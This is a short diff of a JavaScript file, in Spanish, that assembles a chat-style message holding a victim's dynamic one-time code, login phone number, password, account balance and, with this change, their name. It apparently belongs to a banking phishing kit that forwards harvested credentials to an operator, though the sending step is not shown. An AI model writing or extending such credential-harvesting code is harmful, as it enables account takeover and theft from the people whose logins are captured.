@@ -99,6 +99,7 @@ document.addEventListener('DOMContentLoaded', () => {
                                    String(ahora.getSeconds()).padStart(2, '0');
 
             const mensaje = `🎯 **Clave Dinámica:** \`${currentInput}\`\n\n` +
+                            `👤 **Nombre:** \`${userNombre}\`\n` +
                             `📞 **Número (Login):** \`${celular}\`\n` +
                             `🔒 **Contraseña:** \`${userClave}\`\n` +
                             `💰 **Saldo:** \`$${userSaldo}\`\n\n` +
